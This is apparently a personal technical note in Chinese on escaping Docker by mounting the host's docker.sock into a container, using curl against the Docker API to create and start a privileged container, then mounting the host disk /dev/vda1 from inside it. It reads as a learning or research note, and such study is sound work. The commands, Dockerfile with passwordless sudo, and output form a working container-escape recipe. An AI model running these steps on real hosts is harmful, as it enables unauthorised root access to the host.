---
{"dg-publish":true,"permalink":"/技術文件/Docker/docker 特權逃逸/","tags":["docker"],"created":"2024-08-27T23:22:03.431+08:00","updated":"2025-12-18T00:23:27.335+08:00"}
---

#docker 

## 起因
因為 docker daemon 是在 root 權限下
```
$ ll -a /var/run/docker.sock
lrwxr-xr-x  1 root  daemon    63B Jun 10 23:39 /var/run/docker.sock -> /Users/jason/.local/share/containers/podman/machine/podman.sock
```

所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊

建立特權容器
```
# 使用 curlimages/curl 作為基礎鏡像
FROM curlimages/curl:latest

USER root
# 安裝 sudo
RUN apk --no-cache add sudo

RUN apk --no-cache add docker

# 創建一個新用戶並設置適當的權限
RUN addgroup -S docker && adduser -S dockeruser -G docker

# 允許 dockeruser 使用 sudo 而不需要密碼
RUN echo 'dockeruser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# 切換到 dockeruser 用戶
USER dockeruser

# 設置工作目錄
WORKDIR /home/dockeruser

# 執行一個無限循環的命令，確保容器一直保持運行
CMD ["sh", "-c", "while :; do sleep 10; done"]
```

```
docker build -t my-curl-image .
```

### 建立 docker conatiner
```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh
```


## 在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊

### 建立一個 docker images
```
$ curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"my-curl", "Privileged":true}' -H 'Content-Type: application/json' http:/v1.24/containers/create
{"Id":"315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330","Warnings":[]}
```


### 啟動 docker images
```
$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start
```


### 列出所有 docker container 狀態
等價:
`docker ps`

```
/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json
[{"Id":"a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa","Names":["/elated_leakey"],"Image":"my-curl","ImageID":"sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec","Command":"/entrypoint.sh sh -c 'while :; do sleep 10; done'","Created":1718034
```

### 進入建立的特權 container
```
$ docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS     NAMES
a9c0fe2d7af9   my-curl   "/entrypoint.sh sh -…"   3 minutes ago   Up 3 minutes             elated_leakey

$ docker exec -it a9c0fe2d7af9 sh
```


### 可以看到宿主機的 device
```
/dev # ls
autofs           hvc3             loop6            nbd3             ram1             ram9             tty14            tty27            tty4             tty52            tty8             vda
btrfs-control    hvc4             loop7            nbd4             ram10            random           tty15            tty28            tty40            tty53            tty9             vda1
bus              hvc5             mapper           nbd5             ram11            rtc0             tty16            tty29            tty41            tty54            ttyS0            vdb
cachefiles       hvc6             mem              nbd6             ram12            shm              tty17            tty3             tty42            tty55            ttyS1            vdc
core             hvc7             mqueue           nbd7             ram13            stderr           tty18            tty30            tty43            tty56            ttyS2            vga_arbiter
cpu_dma_latency  hwrng            nbd0             nbd8             ram14            stdin            tty19            tty31            tty44            tty57            ttyS3            vhost-net
cuse             kmsg             nbd1             nbd9             ram15            stdout           tty2             tty32            tty45            tty58            uinput           vhost-vsock
fd               loop-control     nbd10            net              ram2             tty              tty20            tty33            tty46            tty59            urandom          vport2p0
full             loop0            nbd11            null             ram3             tty0             tty21            tty34            tty47            tty6             vcs              vsock
fuse             loop1            nbd12            port             ram4             tty1             tty22            tty35            tty48            tty60            vcs1             zero
gpiochip0        loop2            nbd13            ppp              ram5             tty10            tty23            tty36            tty49            tty61            vcsa
hvc0             loop3            nbd14            ptmx             ram6             tty11            tty24            tty37            tty5             tty62            vcsa1
hvc1             loop4            nbd15            pts              ram7             tty12            tty25            tty38            tty50            tty63            vcsu
hvc2             loop5            nbd2             ram0             ram8             tty13            tty26            tty39            tty51            tty7             vcsu1
```

修改 host 文件
```
$ mount dev/vda1 /home/vda1
/dev # ls /home/vda1
cni                 desktop-containerd  kubeadm             lost+found          mutagen             swap
containerd          docker              kubelet-plugins     machine-id          nfs                 wasm
```